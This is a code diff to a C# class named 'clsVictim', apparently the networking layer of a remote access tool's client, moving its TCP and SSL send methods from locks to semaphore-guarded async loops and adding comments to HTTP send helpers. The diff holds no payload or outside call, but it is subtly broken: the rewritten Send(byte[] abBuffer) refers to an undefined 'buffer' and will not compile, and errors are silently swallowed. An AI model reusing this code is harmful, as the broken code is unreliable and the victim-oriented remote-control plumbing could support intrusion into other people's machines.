@@ -11,6 +11,7 @@ using System.Net.Security;
 using Plugin.Abstractions48;
 using System.Runtime.InteropServices.WindowsRuntime;
 using System.Windows.Forms;
+using System.Threading;
 
 namespace winClient48
 {
@@ -31,8 +32,8 @@ namespace winClient48
         public enProtocol m_protocol { get; set; }
 
         //Lock
-        private readonly object _tcpWriteLock = new object();
-        private readonly object _sslWriteLock = new object();
+        private readonly SemaphoreSlim _tcpSemaphore = new SemaphoreSlim(1, 1);
+        private readonly SemaphoreSlim _sslSemaphore = new SemaphoreSlim(1, 1);
 
         public clsVictim(Socket socket)
         {
@@ -56,51 +57,51 @@ namespace winClient48
             HTTP,
         }
 
-        public void Send(int cmd, int param, byte[] msg)
+        public async void Send(int cmd, int param, byte[] msg)
         {
-            if (msg != null)
-            {
-                byte[] buffer = new clsDSP((byte)cmd, (byte)param, msg).GetBytes();
-                
-                lock (_tcpWriteLock)
-                {
-                    socket.BeginSend(buffer, 0, buffer.Length, SocketFlags.None, new AsyncCallback((ar) =>
-                    {
-                        try
-                        {
-                            socket.EndSend(ar);
-                        }
-                        catch (Exception ex)
-                        {
+            if (msg == null)
+                return;
 
-                        }
-                    }), buffer);
+            byte[] buffer = new clsDSP((byte)cmd, (byte)param, msg).GetBytes();
+            if (buffer == null)
+                return;
+
+            try
+            {
+                await _tcpSemaphore.WaitAsync();
+
+                int nOffset = 0;
+                while (nOffset < buffer.Length)
+                {
+                    int nSent = await socket.SendAsync(new ArraySegment<byte>(buffer, nOffset, buffer.Length - nOffset), SocketFlags.None);
+                    nOffset += nSent;
                 }
+            }
+            finally
+            {
+                _tcpSemaphore.Release();
             }
         }
 
-        public void Send(byte[] abBuffer)
+        public async void Send(byte[] abBuffer)
         {
+            if (abBuffer == null)
+                return;
+
             try
             {
-                lock(_tcpWriteLock)
+                await _tcpSemaphore.WaitAsync();
+
+                int nOffset = 0;
+                while (nOffset < buffer.Length)
                 {
-                    socket.BeginSend(abBuffer, 0, abBuffer.Length, SocketFlags.None, new AsyncCallback((ar) =>
-                    {
-                        try
-                        {
-                            socket.EndSend(ar);
-                        }
-                        catch (Exception ex)
-                        {
-                            //MessageBox.Show(ex.Message);
-                        }
-                    }), abBuffer);
+                    int nSent = await socket.SendAsync(new ArraySegment<byte>(buffer, nOffset, buffer.Length - nOffset), SocketFlags.None);
+                    nOffset += nSent;
                 }
             }
-            catch (Exception ex)
+            finally
             {
-                //MessageBox.Show(ex.Message);
+                _tcpSemaphore.Release();
             }
         }
 
@@ -160,30 +161,64 @@ namespace winClient48
         public void fnSslSend(List<string> lsMsg) => fnSslSend(string.Join("|", lsMsg));
         public void fnSslSend(string szMsg) => fnSslSendRAW(Encoding.UTF8.GetBytes(szMsg));
 
-        public void fnSslSendRAW(byte[] abBuffer) => fnSslSendRAW(0, 0, abBuffer);
-        public void fnSslSendRAW(int nCmd, int nParam, byte[] abBuffer)
+        /// <summary>
+        /// SSL send raw data.
+        /// </summary>
+        /// <param name="abBuffer"></param>
+        public async void fnSslSendRAW(byte[] abBuffer) => await fnSslSendRAW(2, 0, abBuffer);
+
+        /// <summary>
+        /// SSL send raw data.
+        /// </summary>
+        /// <param name="nCmd"></param>
+        /// <param name="nParam"></param>
+        /// <param name="abBuffer"></param>
+        /// <returns></returns>
+        public async Task fnSslSendRAW(int nCmd, int nParam, byte[] abBuffer)
         {
             byte[] abData = new clsDSP((byte)nCmd, (byte)nParam, abBuffer).GetBytes();
-            
-            lock (_sslWriteLock)
-            {
-                m_sslClnt.BeginWrite(abData, 0, abData.Length, new AsyncCallback((ar) =>
-                {
-                    try
-                    {
-                        m_sslClnt.EndWrite(ar);
-                    }
-                    catch (Exception ex)
-                    {
 
-                    }
-                }), abData);
+            await _sslSemaphore.WaitAsync();
+            try
+            {
+                await m_sslClnt.WriteAsync(abData, 0, abData.Length);
+                //await m_sslClnt.FlushAsync();
+                await Task.Yield();
+            }
+            catch (Exception ex)
+            {
+                
+            }
+            finally
+            {
+                _sslSemaphore.Release();
             }
         }
 
+        /// <summary>
+        /// Send HTTP web response.
+        /// </summary>
+        /// <param name="asMsg"></param>
         public void fnHttpSend(string[] asMsg) => fnHttpSend(asMsg.ToList());
+        
+        /// <summary>
+        /// Send HTTP web response.
+        /// </summary>
+        /// <param name="lsMsg"></param>
         public void fnHttpSend(List<string> lsMsg) => fnHttpSend(string.Join("|", lsMsg));
+        
+        /// <summary>
+        /// Send HTTP web response.
+        /// </summary>
+        /// <param name="szMsg"></param>
         public void fnHttpSend(string szMsg) => fnHttpSend(2, 0, szMsg);
+
+        /// <summary>
+        /// Send HTTP web response.
+        /// </summary>
+        /// <param name="nCmd">Command.</param>
+        /// <param name="nParam">Parameter</param>
+        /// <param name="szMsg">Message, HTTP response body.</param>
         public void fnHttpSend(int nCmd, int nParam, string szMsg)
         {
             clsDSP dsp = new clsDSP((byte)nCmd, (byte)nParam, Encoding.UTF8.GetBytes(szMsg));
